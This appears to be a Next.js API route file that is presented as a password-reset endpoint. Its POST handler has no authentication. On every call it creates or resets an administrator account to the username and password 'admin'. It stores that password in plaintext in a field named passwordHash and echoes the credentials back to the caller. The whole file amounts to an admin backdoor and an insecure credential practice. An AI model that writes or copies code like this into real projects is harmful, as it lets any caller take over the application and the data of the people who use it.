import { NextRequest, NextResponse } from 'next/server';
import { connectToDatabase } from '@/lib/mongodb';
import { User } from '@/lib/models/User';

export async function POST(request: NextRequest) {
  try {
    await connectToDatabase();
    // Admin direct override: resets credentials to admin / admin
    let dbUser = await User.findOne({ username: 'admin' });
    if (!dbUser) {
      dbUser = await User.create({
        username: 'admin',
        passwordHash: 'admin',
        role: 'admin',
      });
    } else {
      dbUser.passwordHash = 'admin';
      dbUser.updatedAt = new Date();
      await dbUser.save();
    }

    return NextResponse.json({
      success: true,
      message: 'Credentials reset to default: username: admin, password: admin',
    });
  } catch (error: unknown) {
    console.error('Password reset error:', error);
    const message = error instanceof Error ? error.message : 'Reset failed';
    return NextResponse.json({ error: message }, { status: 500 });
  }
}
